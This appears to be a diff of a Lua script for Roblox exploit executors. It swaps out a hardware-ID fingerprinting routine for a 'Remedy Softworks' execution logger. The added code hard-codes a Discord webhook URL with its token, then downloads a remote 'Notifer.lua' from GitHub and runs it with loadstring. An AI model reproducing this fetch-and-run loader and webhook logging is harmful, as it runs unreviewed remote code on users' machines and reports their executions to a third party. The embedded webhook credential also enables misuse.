@@ -1,40 +1,14 @@
-local http_request
+getgenv().Title = "Remedy Softworks"
+getgenv().ThumbnailUrl = "https://cdn.discordapp.com/attachments/1285691354193596508/1285692101249728583/yhhh.png?ex=66eb3193&is=66e9e013&hm=7c97a0f5863ab2dd6fac0ebb18a76a43354950034ce0064e85204cef8008ac7e&"
+getgenv().Color = 0x000000 -- Black
 
-if syn then
-    http_request = syn.request
-elseif SENTINEL_V2 then
-    http_request = function(tb)
-        return {
-            StatusCode = 200,
-            Body = request(tb.Url, tb.Method, tb.Body or '')
-        }
-    end
-else
-    http_request = request
-end
+getgenv().FieldTitle = "New Execution!"
+getgenv().FieldText = "LOGS"
 
-function get_hwid()
-    local response = http_request({
-        Url = 'https://httpbin.org/get',
-        Method = 'GET'
-    })
+getgenv().FooterText = "Remedy Softworks"
+getgenv().FooterUrl = "https://discord.gg/DURrw6wcZu"
 
-    local decoded_body = game:GetService('HttpService'):JSONDecode(response.Body)
-    local hwid_keys = {
-        "Syn-Fingerprint",
-        "Exploit-Guid",
-        "Krnl-Hwid",
-        "Sw-Fingerprint",
-        "Wave-Fingerprint"
-    }
+getgenv().Webhook = "https://discord.com/api/webhooks/1285692442586251354/HdfmF8uf3mb0pjIh3J6yoo6SmdmiE9n8-VBpP3w5UdXDSrej1t5DAtLyUng1MVfCQAId"
 
-    for _, key in ipairs(hwid_keys) do
-        if decoded_body.headers[key] then
-            return decoded_body.headers[key]
-        end
-    end
-
-    return nil
-end
-
-_G.get_hwid = get_hwid
+coroutine.wrap(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Webhook/main/Notifer.lua"))()
+end)()
